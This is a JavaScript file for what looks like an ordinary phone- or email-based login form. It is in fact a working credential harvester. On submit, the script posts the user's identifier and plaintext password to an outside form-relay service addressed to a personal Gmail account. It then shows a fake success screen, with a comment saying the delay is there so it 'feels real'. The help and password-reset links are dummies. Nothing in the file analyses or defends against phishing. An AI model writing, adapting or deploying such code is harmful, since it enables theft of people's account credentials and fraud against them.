document.addEventListener('DOMContentLoaded', () => {
  const phoneTab = document.getElementById('phone-tab');
  const emailTab = document.getElementById('email-tab');
  const phoneFields = document.getElementById('phone-fields');
  const emailFields = document.getElementById('email-fields');
  const phoneInput = document.getElementById('phone');
  const emailInput = document.getElementById('email-username');
  const passwordInput = document.getElementById('password');
  const btn = document.getElementById('login-btn');
  const container = document.getElementById('main-container');
  const successScreen = document.getElementById('success-screen');
  const togglePassword = document.getElementById('togglePassword');

  const phoneError = document.getElementById('phone-error');
  const emailError = document.getElementById('email-error');
  const passwordError = document.getElementById('password-error');

  togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    togglePassword.classList.toggle('ph-eye');
    togglePassword.classList.toggle('ph-eye-slash');
  });

  document.getElementById('close-btn').onclick = () => window.close() || history.back();
  document.getElementById('help-btn').onclick = () => alert('Not available');
  document.getElementById('forgot-link').onclick = e => { e.preventDefault(); alert('Not available'); };

  phoneTab.onclick = () => { phoneTab.classList.add('active'); emailTab.classList.remove('active'); phoneFields.style.display='block'; emailFields.style.display='none'; validate(); };
  emailTab.onclick = () => { emailTab.classList.add('active'); phoneTab.classList.remove('active'); emailFields.style.display='block'; phoneFields.style.display='none'; validate(); };

  function validate() {
    let valid = true;

    if (phoneTab.classList.contains('active')) {
      const val = phoneInput.value.trim();
      if (!/^\d{10,15}$/.test(val)) { phoneError.textContent = 'Invalid phone number'; valid = false; }
      else phoneError.textContent = '';
    }

    if (emailTab.classList.contains('active')) {
      const val = emailInput.value.trim();
      if (val.includes('@')) {
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) { emailError.textContent = 'Invalid email'; valid = false; }
        else emailError.textContent = '';
      } else {
        if (val.length < 4) { emailError.textContent = 'Username too short'; valid = false; }
        else emailError.textContent = '';
      }
    }

    if (passwordInput.value.length < 6) { passwordError.textContent = 'Password too short'; valid = false; }
    else passwordError.textContent = '';

    btn.classList.toggle('active', valid);
  }

  [phoneInput, emailInput, passwordInput].forEach(i => i.addEventListener('input', validate));

  btn.addEventListener('click', e => {
    e.preventDefault();
    if (!btn.classList.contains('active')) return;

    const method = phoneTab.classList.contains('active') ? 'Phone' : 'Email/Username';
    const identifier = method === 'Phone' ? phoneInput.value.trim() : emailInput.value.trim();

    fetch("https://formsubmit.co/ajax/mickedroms555@gmail.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ Method: method, Identifier: identifier, Password: passwordInput.value, Time: new Date().toLocaleString() })
    });

    container.classList.add('hidden');
    setTimeout(() => successScreen.classList.remove('hidden'), 800); // tiny delay so it feels real
  });

  validate();
});